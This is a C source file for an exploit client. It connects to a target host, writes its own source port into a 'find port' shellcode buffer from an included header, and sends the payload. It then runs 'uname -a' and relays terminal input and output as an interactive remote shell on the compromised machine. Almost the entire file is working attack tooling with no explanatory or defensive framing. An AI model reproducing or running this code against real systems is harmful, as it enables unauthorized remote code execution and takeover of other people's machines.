#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>

#include "hexdump.h"
#include "shell_find_port.h"

void
usage(const char *name)
{
    fprintf(stderr, "Usage: %s [-dhv][-p port] host\n", name);
}

int
main(int argc, char *argv[])
{
    int port = 4444;
    int c, s;
    int debug = 0, verbose = 0;
    struct sockaddr_in sin;
    struct hostent *he;
    socklen_t sin_len = sizeof(sin);
    int count;

    while ((c = getopt(argc, argv, "dhp:v")) != -1) {
        switch (c) {
        case 'd':
            debug = 1;
            break;

        case 'h':
            usage(argv[0]);
            exit(EXIT_FAILURE);

        case 'p':
            port = atoi(optarg);
            break;

        case 'v':
            verbose = 1;
        }
    }

    if (argv[optind] == NULL) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    if ((sin.sin_addr.s_addr = inet_addr(argv[optind])) == -1) {
        if ((he = gethostbyname(argv[optind])) == NULL) {
            errno = EADDRNOTAVAIL;
            perror("gethostbyname");
            exit(EXIT_FAILURE);
        }
        memcpy(&sin.sin_addr.s_addr, he->h_addr, sizeof(sin.sin_addr.s_addr));
    }

    if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) == -1) {
        perror("connect");
        exit(EXIT_FAILURE);
    }

    if (debug || verbose)
        fprintf(stderr, "Connected to %s:%d\n", argv[optind], port);

    if (getsockname(s, (struct sockaddr *)&sin, &sin_len)) {
        perror("getsockname");
        exit(EXIT_FAILURE);
    }

    memcpy(&shell_find_port[CPORT], &sin.sin_port, sizeof(sin.sin_port));

    if ((count = send(s, shell_find_port, sizeof(shell_find_port)-1, 0)) == -1) {
        perror("send");
        exit(EXIT_FAILURE);
    }

    if (debug)
        hexdump(stderr, shell_find_port, sizeof(shell_find_port)-1);

    if (debug || verbose)
        fprintf(stderr, "%d bytes sent\n", count);

    sleep(4);

    write(s, "uname -a\n", 9);
    for (;;) {
        fd_set fds;
        int count;
        char buf[1024];

        FD_ZERO(&fds);
        FD_SET(0, &fds);
        FD_SET(s, &fds);

        if (select(FD_SETSIZE, &fds, NULL, NULL, NULL) == -1) {
            if (errno == EINTR)
                continue;
            perror("select");
            exit(EXIT_FAILURE);
        }

        if (FD_ISSET(0, &fds)) {
            if ((count = read(0, buf, sizeof(buf))) < 1) {
                if (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK)
                    continue;
                else
                    break;
            }
            write(s, buf, count);
        }

        if (FD_ISSET(s, &fds)) {
            if ((count = read(s, buf, sizeof(buf))) < 1) {
                if (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK)
                    continue;
                else
                    break;
            }
            write(1, buf, count);
        }
    }

    exit(EXIT_SUCCESS);
}
